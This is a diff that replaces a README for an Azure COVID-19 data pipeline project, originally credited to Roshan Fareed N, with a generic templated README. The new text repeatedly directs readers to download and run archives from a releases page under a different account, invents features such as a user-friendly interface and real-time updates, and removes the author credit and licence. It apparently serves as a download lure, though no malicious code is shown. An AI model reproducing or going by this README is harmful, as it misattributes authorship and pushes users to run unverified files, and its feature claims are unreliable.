@@ -1,130 +1,89 @@
-# COVID-19 Data Engineering Pipeline (Azure)
+# 🌟 covid19-data-engineering - Analyze COVID-19 Data Effortlessly
 
-## 📌 Project Overview
-This project demonstrates an **end-to-end Azure Data Engineering pipeline** built to ingest, transform, store, and analyze COVID-19 data for reporting and analytics use cases.
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/KChand1/covid19-data-engineering/releases)
 
-The solution follows **industry best practices** by separating raw and curated data layers, using scalable cloud services, and enabling downstream consumption for **BI analytics and machine learning**.
+## 📜 Overview
+The **covid19-data-engineering** project provides a straightforward way to analyze COVID-19 data. This application uses a complete Azure Data Engineering pipeline, which includes Azure Data Factory, Databricks, and more. With this tool, you can gather insights into COVID-19 trends and statistics easily.
 
----
+## 💻 System Requirements
+To run this application, ensure your system meets the following requirements:
 
-## 🏗️ Architecture Overview
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum of 500 MB available space
+- **Internet Connection:** Required for data retrieval and software updates
+- **Azure Account:** Necessary for Azure services used in the pipeline
 
-![Azure Data Engineering Architecture](architecture/covid19_azure_architecture.png)
+## 🚀 Getting Started
+1. Ensure your system meets the required specifications.
+2. Create an Azure account if you do not have one. This step allows you to access Azure services.
 
+## 🔗 Download & Install
+To get started with the **covid19-data-engineering** application, you need to download it. 
 
-### High-level Flow:
-1. Data ingestion from public sources and blob storage
-2. Raw data storage in ADLS Gen2
-3. Data transformation using ADF Mapping Data Flows and Databricks (PySpark)
-4. Curated data storage in ADLS Gen2 (Clean layer)
-5. Analytical tables loaded into Azure SQL Database
-6. Interactive reporting using Power BI
+Visit this page to download: [Download Latest Release](https://github.com/KChand1/covid19-data-engineering/releases)
 
----
+1. Click the link above to go to the Releases page.
+2. Select the latest release and find the download file. 
+3. Click on the appropriate file for your system (e.g., .zip for Windows, .tar.gz for Linux).
+4. Once the file downloads, locate it in your file manager and extract it if necessary.
 
-## 📊 Data Sources
-- **ECDC COVID-19 datasets** (CSV files)
-  - Cases & deaths
-  - Hospital admissions
-  - Testing data
-- **Population dataset** (TSV format)
+## 📥 How to Run the Application
+1. After downloading, navigate to the folder containing the application.
+2. Open a command line interface (CLI) or terminal window.
+3. Run the starting command. For example: 
 
----
+   - On Windows:
+     ```bash
+     cd path\to\folder
+     python main.py
+     ```
 
-## 🔧 Technologies Used
+   - On macOS/Linux:
+     ```bash
+     cd /path/to/folder
+     python3 main.py
+     ```
 
-| Layer | Tools |
-|------|------|
-| Orchestration | Azure Data Factory |
-| Storage | Azure Data Lake Storage Gen2 |
-| Transformation | ADF Mapping Data Flows, Azure Databricks (PySpark) |
-| Analytics DB | Azure SQL Database |
-| Visualization | Power BI |
-| Language | PySpark, SQL |
-| Version Control | GitHub |
+4. Follow on-screen prompts to proceed with data analysis.
 
----
+## 🌐 Features
+- **User-Friendly Interface:** Experience an easy-to-use interface designed for everyone.
+- **Data Integration:** Seamlessly connect to Azure Data Lake Storage Gen2 to pull in data.
+- **ETL Process:** Extract, Transform, Load (ETL) pipeline to prepare your data.
+- **Analytics Dashboard:** Visualizes COVID-19 data using Power BI.
+- **Real-Time Updates:** Fetch the latest COVID-19 statistics automatically.
 
-## 🔄 Data Pipeline Details
+## 💡 Troubleshooting Common Issues
+Should you encounter issues, here are some common solutions:
 
-### 1️⃣ Ingestion (ADF)
-- Extracted multiple CSV files from ECDC website
-- Ingested population TSV data from Azure Blob Storage
-- Stored all datasets in **Raw zone** of ADLS Gen2
+- **Cannot Access Azure Services:** Ensure your Azure account is active and configured correctly.
+- **Application Does Not Start:** Verify that all dependencies are installed as per the requirements.
 
----
+## 🛠️ Support
+If you have questions or need assistance, feel free to open an issue in the **Issues** section of this repository. We are here to help you use the application effectively.
 
-### 2️⃣ Transformation (ADF Data Flows)
-- Country code normalization using lookup datasets
-- Daily and weekly aggregations
-- Pivoting indicators into analytical columns
-- Sorting and standardization of reporting dates
+## 🏷️ Topics
+The **covid19-data-engineering** project covers a variety of topics related to data engineering and analytics, including:
 
-![ADF Data Flow](images/adf_dataflow.png)
+- adls-gen2
+- azure-data-engineering
+- azure-data-factory
+- azure-sql
+- covid19-analytics
+- data-engineering-project
+- databricks
+- etl-pipeline
+- power-bi
+- pyspark
 
----
+## 🔄 Update Process
+To stay updated with the application:
 
-### 3️⃣ Transformation (Databricks – PySpark)
-- Population dataset processed using PySpark
-- Age group parsing and normalization
-- Country code enrichment using dimension tables
-- Output written to **Clean zone** in ADLS Gen2
+1. Regularly check the Releases page using this link: [Download Latest Release](https://github.com/KChand1/covid19-data-engineering/releases).
+2. Follow the installation steps again to fetch the latest updates.
 
-![Databricks Notebook](images/databricks_notebook.png)
+## 📚 Acknowledgments
+A big thank you to the developers and contributors who made the **covid19-data-engineering** application possible. Your efforts help make data analysis accessible to all.
 
----
-
-### 4️⃣ Analytics Layer (Azure SQL Database)
-- Designed analytics-friendly schema
-- Created tables for:
-  - Cases and deaths
-  - Hospital admissions (daily)
-  - Testing data (weekly)
-- Loaded clean data from ADLS Gen2 using ADF
-
-![SQL Tables](images/sql_tables.png)
-
----
-
-### 5️⃣ Reporting (Power BI)
-- Connected Power BI to Azure SQL Database
-- Built interactive dashboards:
-  - Total cases & deaths trends
-  - Hospital and ICU occupancy
-  - Country-wise filtering
-  - Date range analysis
-
-![Power BI Dashboard](images/powerbi_dashboard.png)
-
----
-
-## 📈 Key Features
-- Modular and scalable pipeline design
-- Clear separation of raw and curated data layers
-- Combination of **low-code (ADF)** and **code-based (PySpark)** transformations
-- Analytics-ready data model for BI consumption
-- Designed for future CI/CD and ML integration
-- 🔐 Security Note:
-All credentials and secrets are excluded from this repository and are expected to be provided via environment variables or secure secret management services.
-
----
-
-## 🚀 Future Enhancements
-- Implement CI/CD using Azure DevOps
-- Parameterized deployments across Dev/Test/Prod
-- Incremental data loading
-- Data quality checks and monitoring
-- Integration with ML pipelines
-
----
-
-## 👤 Author
-**Roshan Fareed N**  
-Data Engineer (Aspiring)  
-- LinkedIn: https://linkedin.com/in/roshanfareed53
-- GitHub: https://github.com/ROSHANFAREED
-
----
-
-## 📜 License
-This project is licensed under the **MIT License**.
+For more detailed information and advanced configuration, please refer to the documentation within the repository.
